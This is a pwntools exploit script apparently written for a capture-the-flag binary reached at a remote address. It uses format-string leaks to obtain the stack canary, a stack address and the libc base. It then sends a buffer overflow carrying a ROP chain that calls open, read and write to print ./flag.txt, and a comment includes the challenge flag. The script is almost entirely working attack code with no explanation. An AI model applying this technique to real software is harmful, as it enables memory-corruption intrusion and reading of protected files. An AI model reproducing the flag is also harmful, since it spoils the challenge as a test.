#!/usr/bin/env python
from pwn import *
from time import sleep

exe = ELF("./task")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

sshc = None
r = None
nc = "nc 34.155.40.100 1236"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
SLEEP_TIME = 0

# Communication ----------------------------------------------------------
tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))

def sendl(x):
    sleep(SLEEP_TIME)
    r.sendline(tobytes(x))


def send(x):
    sleep(SLEEP_TIME)
    r.send(tobytes(x))


# Logging ----------------------------------------------------------------
def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


# Helpers ----------------------------------------------------------------
def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return b'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
    
    return r


def main():
    global r
    r = conn()
    
    r.sendline(b"%15$p")
    r.recvuntil(b"message: ")
    canary = int(r.readline().strip(), 16)
    logh("Canary", canary)
    
    r.sendline(b"%14$p")
    r.recvuntil(b"message: ")
    stack_leak = int(r.readline().strip(), 16)
    logh("stack leak", stack_leak)
    
    inputAdr = stack_leak - 0x140
    logh("Input Adr", inputAdr)
    
    r.sendline(b"%19$p")
    r.recvuntil(b"message: ")
    libc_leak = int(r.readline().strip(), 16)
    logh("libc leak", libc_leak)
    
    libc_base = libc_leak - 0x21c87
    logh("Libc base", libc_base)
    
    pop_rdi = 0x000000000002164f + libc_base
    pop_rsi = 0x0000000000023a6a + libc_base
    pop_rdx = 0x0000000000001b96 + libc_base
    
    payload = b"a"*72
    payload += p64(canary)
    payload += b"a"*8
    
    payload += p64(pop_rdi) + p64(inputAdr+1)
    payload += p64(pop_rsi) + p64(0)
    payload += p64(pop_rdx) + p64(256)
    payload += p64(libc_base + libc.symbols.open)
    
    payload += p64(pop_rdi) + p64(3)
    payload += p64(pop_rsi) + p64(inputAdr)
    payload += p64(pop_rdx) + p64(256)
    payload += p64(libc_base + libc.symbols.read)
    
    payload += p64(pop_rdi) + p64(1)
    payload += p64(pop_rsi) + p64(inputAdr)
    payload += p64(pop_rdx) + p64(256)
    payload += p64(libc_base + libc.symbols.write)
    
    r.sendline(payload)
    
    pause()
    r.sendline(b"x./flag.txt\0") # FLAG{r0p_r0py_Rop0_ch41n}

    r.interactive()


if __name__ == "__main__":
    main()

